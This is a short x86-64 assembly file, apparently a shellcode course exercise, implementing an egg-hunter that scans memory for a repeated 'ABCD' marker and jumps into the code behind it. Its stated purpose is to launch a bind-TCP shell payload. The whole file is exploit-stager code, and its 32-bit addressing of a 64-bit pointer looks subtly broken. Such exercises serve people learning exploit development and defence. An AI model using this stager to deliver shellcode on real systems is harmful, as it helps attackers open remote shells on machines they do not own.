; Filename: EggHunter.nasm
; Author: SLAE64 - 1525
;
; Purpose: execute through egg-hunter routine the shellcode of ShellBindTcp
BITS 64

global _start			

section .text

EGG equ 'ABCD'

_start:
    ; load final address in rax
    lea rax, [rel address_space_end]

search:
    inc rax
    cmp dword [eax], EGG
    jne search
    cmp dword [eax + 0x4], EGG
    jne search
    add rax, 8
    jmp rax

address_space_end:
